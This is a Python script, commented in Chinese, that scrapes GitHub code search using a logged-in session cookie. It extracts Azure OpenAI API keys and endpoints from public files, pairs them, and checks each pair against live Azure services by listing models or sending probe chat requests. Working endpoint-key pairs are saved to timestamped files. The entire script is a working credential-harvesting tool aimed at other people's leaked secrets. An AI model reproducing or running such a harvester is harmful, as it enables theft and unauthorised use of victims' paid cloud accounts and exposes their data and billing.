#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Azure OpenAI 并发扫描器
专门扫描 GitHub 上的 Azure OpenAI API 密钥和端点
支持:
1. GitHub Session 搜索 (能够搜索到普通API搜不到的代码)
2. 自动提取 Key 和 Endpoint (自动配对)
3. 并发验证
4. 模型枚举 (尝试列出可用模型)
"""

import os
import re
import time
import json
import threading
import random
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
from urllib.parse import urlparse

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# Azure OpenAI API配置
API_VERSION = "2024-02-01"
COMMON_DEPLOYMENTS = [
    "gpt-35-turbo",
    "gpt-4",
    "gpt-4o",
    "gpt-4-turbo",
    "text-embedding-ada-002",
    "gpt-3.5-turbo",
    "gpt-4-32k"
]

# 并发配置
MAX_WORKERS = 10
API_DELAY = 1

# 存储结果
live_keys_queue = Queue()
processed_keys = set() # 存储 (endpoint, key) 元组
file_lock = threading.Lock()

# 文件名
results_filename = None
simple_filename = None

def init_files():
    global results_filename, simple_filename
    if results_filename is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_filename = f'azure_live_keys_{timestamp}.txt'
        simple_filename = f'azure_keys_simple_{timestamp}.txt'
        
        with open(results_filename, 'w', encoding='utf-8') as f:
            f.write("=== Azure OpenAI 扫描结果 ===\n")
            f.write(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            
        with open(simple_filename, 'w', encoding='utf-8') as f:
            f.write("=== Azure OpenAI 可用配置 ===\n")
            f.write("格式: Endpoint,Key\n")
            f.write("=" * 40 + "\n")

def save_live_result(result):
    """实时保存结果"""
    init_files()
    
    with file_lock:
        # 详细日志
        with open(results_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔗 Endpoint: {result['endpoint']}\n")
            f.write(f"🔑 Key: {result['key']}\n")
            f.write(f"📊 Status: {result['status']}\n")
            if result.get('models'):
                f.write(f"📋 Models: {', '.join(result['models'])}\n")
            f.write(f"📂 Repo: {result['repo']}\n")
            f.write(f"📄 File: {result['file_url']}\n")
            f.write("-" * 60 + "\n")
            
        # 简化列表 (CSV格式)
        with open(simple_filename, 'a', encoding='utf-8') as f:
            f.write(f"{result['endpoint']},{result['key']}\n")
            
        print(f"💾 已保存: {result['endpoint']} (Models: {len(result.get('models', []))})")

def validate_azure_pair(endpoint, key):
    """
    验证 Azure Endpoint 和 Key 是否匹配且有效
    返回: (is_valid, status_msg, found_models)
    """
    # 1. 尝试通过 Management API 列出模型
    # GET {endpoint}/openai/models?api-version={version}
    
    endpoint = endpoint.rstrip('/')
    if not endpoint.startswith('http'):
        endpoint = f"https://{endpoint}"
    
    # 修正: 确保 endpoint 格式正确 (有时提取到 domain.openai.azure.com/path)
    # Azure 标准格式通常是 https://resource.openai.azure.com
    
    headers = {
        "api-key": key,
        "Content-Type": "application/json"
    }
    
    # 方法 A: 列出模型 (首选)
    list_url = f"{endpoint}/openai/models?api-version={API_VERSION}"
    try:
        resp = requests.get(list_url, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            data = resp.json()
            models = [item['id'] for item in data.get('data', [])]
            return True, "🟢 存活 (List Models Success)", models
        elif resp.status_code == 401:
            return False, "🔴 无效 Key (Invalid Key)", []
        elif resp.status_code == 403:
             # 可能是权限不足，但 Key 可能是对的，尝试方法 B
            pass
            
    except Exception as e:
        # 网络错误等，继续尝试方法 B
        pass

    # 方法 B: 尝试 Chat Completions (猜测部署名)
    # 如果无法列出模型，只能通过 404 错误信息来探测
    
    for deployment in COMMON_DEPLOYMENTS:
        chat_url = f"{endpoint}/openai/deployments/{deployment}/chat/completions?api-version={API_VERSION}"
        payload = {
            "messages": [{"role": "user", "content": "Hi"}],
            "max_tokens": 1
        }
        
        try:
            resp = requests.post(chat_url, headers=headers, json=payload, timeout=10)
            
            if resp.status_code == 200:
                return True, f"🟢 存活 (Chat on {deployment})", [deployment]
            elif resp.status_code == 401:
                return False, "🔴 无效 Key", []
            elif resp.status_code == 429:
                return True, "🟡 存活但限流 (Rate Limited)", []
            elif resp.status_code == 404:
                msg = resp.json().get('error', {}).get('message', '')
                if "The API deployment for this resource does not exist" in msg:
                    # 这是好消息！说明 Key 是对的，只是我们猜错了部署名
                    # 这种情况下我们标记为存活，但未知模型
                    return True, "🟡 存活但未找到部署 (Valid Key, Deployment Not Found)", []
        except:
            continue
            
    return False, "⚪ 无法验证 (Validation Failed)", []

def process_github_file(file_url, worker_id):
    """下载并处理文件内容"""
    try:
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        content = resp.text
        
        # 提取 Potentials
        # 1. Azure Keys (32 hex chars)
        # 2. Azure Endpoints (https://*.openai.azure.com)
        
        keys = re.findall(r'(?:key|token|secret)["\']?\s*[:=]\s*["\']([0-9a-fA-F]{32})["\']', content, re.IGNORECASE)
        # 也要匹配纯 32位 hex，稍微宽泛一点
        raw_hexs = re.findall(r'\b[0-9a-fA-F]{32}\b', content)
        
        # 特殊 Key 模式 (用户指定)
        special_keys = re.findall(r'(?:^|[^A-Za-z0-9])([A-Za-z0-9]{15,}JQQJ99B[A-Za-z0-9]{1,10}XJ3w3A{3,6}[A-Za-z0-9]{0,30}COG[A-Za-z0-9]{2,6})(?:[^A-Za-z0-9]|$)', content)

        # 提取 Azure Endpoints (支持 openai, cognitiveservices, services)
        endpoints = re.findall(r'https://[a-zA-Z0-9-]+\.(?:openai|cognitiveservices|services)\.azure\.com', content)
        
        # 过滤无效 Endpoints (占位符)
        ignored_domains = {
            'your-resource', 'your-endpoint', 'your-project', 'your-azure-openai', 
            'my-resource', 'example', 'placeholder', 'api-management', 'gateway',
            'your-open-ai', 'replace-with', 'your-service', 'your-name'
        }
        
        valid_endpoints = set()
        for ep in endpoints:
            domain = urlparse(ep).netloc.split('.')[0].lower()
            if domain not in ignored_domains and 'your' not in domain and 'example' not in domain:
                valid_endpoints.add(ep)

        # 合并所有可能的 Key
        candidates_keys = set(keys + raw_hexs + special_keys)
        
        if not candidates_keys or not valid_endpoints:
            return

        # 尝试笛卡尔积配对 (一个文件里的 Key 和 Endpoint 很可能是一对)
        repo_match = re.search(r'githubusercontent\.com/([^/]+/[^/]+)', raw_url)
        repo_name = repo_match.group(1) if repo_match else "unknown"
        
        for ep in valid_endpoints:
            for key in candidates_keys:
                pair_id = (ep, key)
                with file_lock:
                    if pair_id in processed_keys:
                        continue
                    processed_keys.add(pair_id)
                
                # 验证
                print(f"[Worker-{worker_id}] 🔍 验证: {ep} | {key[:6]}...")
                is_valid, status, models = validate_azure_pair(ep, key)
                
                if is_valid:
                    result = {
                        "endpoint": ep,
                        "key": key,
                        "status": status,
                        "models": models,
                        "repo": repo_name,
                        "file_url": file_url
                    }
                    save_live_result(result)
                    print(f"[Worker-{worker_id}] ✅ 发现有效配置!")
                    
                time.sleep(0.5) # 避免过快请求
                
    except Exception as e:
        # print(f"[Worker-{worker_id}] Error: {e}")
        pass

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def search_github(query, max_pages=5):
    links = set()
    print(f"📡 搜索: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Error {resp.status_code}")
                break
                
            # 提取链接 (兼容 Session Search 返回的 HTML)
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                break
                
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                links.add(full)
                
            print(f"   Page {page}: found {len(page_links)} links")
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   Search Error: {e}")
            break
            
    return list(links)

def main():
    if not GITHUB_SESSION:
        print("❌ 错误: 请在 .env 文件中设置 GITHUB_SESSION")
        return

    print("🚀 Azure OpenAI Scanner Started")
    print(f"🔥 Threads: {MAX_WORKERS}")
    
    # Azure 特征查询 (用户指定)
    models = [
        "gpt-3.5-turbo", "gpt-3.5-turbo-0125", "gpt-3.5-turbo-1106",
        "gpt-4", "gpt-4-0125-preview", "gpt-4-0613", "gpt-4-1106-preview",
        "gpt-4-turbo", "gpt-4-turbo-2024-04-09",
        "gpt-4.1", "gpt-4.1-2025-04-14", "gpt-4.1-mini", "gpt-4.1-mini-2025-04-14", "gpt-4.1-nano", "gpt-4.1-nano-2025-04-14",
        "gpt-4o", "gpt-4o-2024-05-13", "gpt-4o-2024-08-06", "gpt-4o-2024-11-20",
        "gpt-4o-mini", "gpt-4o-mini-2024-07-18",
        "gpt-5", "gpt-5-2025-08-07", "gpt-5-chat-latest", "gpt-5-mini", "gpt-5-mini-2025-08-07", "gpt-5-nano", "gpt-5-nano-2025-08-07",
        "gpt-5.1", "gpt-5.1-2025-11-13",
        "grok-4-latest", "gpt-oss-120b", "gpt-oss-20b",
        "o1", "o1-2024-12-17", "o1-mini", "o1-mini-2024-09-12",
        "o3", "o3-2025-04-16", "o3-mini", "o3-mini-2025-01-31",
        "o4-mini", "o4-mini-2025-04-16"
    ]

    key_regex = r'/(^|[^A-Za-z0-9])[A-Za-z0-9]{15,}JQQJ99B[A-Za-z0-9]{1,10}XJ3w3A{3,6}[A-Za-z0-9]{0,30}COG[A-Za-z0-9]{2,6}([^A-Za-z0-9]|$)/'
    hex_key_regex = r'/\b[0-9a-f]{32}\b/'
    
    base_queries = [
        # 完整 URL 正则 + 特殊 Key 正则
        r'/https:\/\/[a-z0-9-]+\.openai\.azure\.com/ ' + key_regex,
        r'/https:\/\/[a-z0-9-]+\.cognitiveservices\.azure\.com/ ' + key_regex,
        r'/https:\/\/[a-z0-9-]+\.services\.azure\.com/ ' + key_regex,
        # 完整 URL 正则 + Hex Key 正则
        r'/https:\/\/[a-z0-9-]+\.openai\.azure\.com/ ' + hex_key_regex,
        r'/https:\/\/[a-z0-9-]+\.cognitiveservices\.azure\.com/ ' + hex_key_regex,
        r'/https:\/\/[a-z0-9-]+\.services\.azure\.com/ ' + hex_key_regex,
        # 简化域名 + 特殊 Key 正则
        r'openai.azure.com ' + key_regex,
        r'cognitiveservices.azure.com ' + key_regex,
        r'services.azure.com ' + key_regex,
        # 简化域名 + Hex Key 正则
        r'openai.azure.com ' + hex_key_regex,
        r'cognitiveservices.azure.com ' + hex_key_regex,
    ]

    queries = list(base_queries)
    
    for model in models:
        queries.append(f'{base_queries[0]} {model}')
        queries.append(f'{base_queries[1]} {model}')
        queries.append(f'{base_queries[2]} {model}')
    
    all_files = set()
    for q in queries:
        files = search_github(q, max_pages=5)
        all_files.update(files)
        
    print(f"🗂️ Total unique files to process: {len(all_files)}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_github_file, url, i%MAX_WORKERS) for i, url in enumerate(all_files)]
        for _ in concurrent.futures.as_completed(futures):
            pass
            
    print("\n🏁 Scan Complete.")
    if results_filename:
        print(f"📄 Results: {results_filename}")

if __name__ == "__main__":
    main()
